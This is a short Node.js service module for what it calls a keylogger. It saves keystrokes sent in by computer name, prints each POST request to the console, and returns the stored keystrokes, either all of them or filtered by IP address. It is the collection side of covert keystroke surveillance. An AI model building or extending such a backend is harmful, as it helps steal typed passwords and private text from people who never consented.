const keyloggerRepo = require("../repository/keyloggerRepo");

const keyloggerService = {
    connectDB:() => {
        return keyloggerRepo.connectDB();
    },
    saveKeystrokes: postReq => {
        console.log("POST REQUEST: ", postReq);
        return keyloggerRepo.saveStrokes(postReq.computerName, postReq.keystrokes);
    },
    getKeyStrokes: () => {
        return keyloggerRepo.getAllStrokes();
    },
    getAllStrokes: () => {
        return keyloggerRepo.retrieveKeyStrokes();
    },
    getKeyStrokesByName: ipAddr => {
        return keyloggerRepo.getStrokesByIp(ipAddr);
    }
};


module.exports = keyloggerService;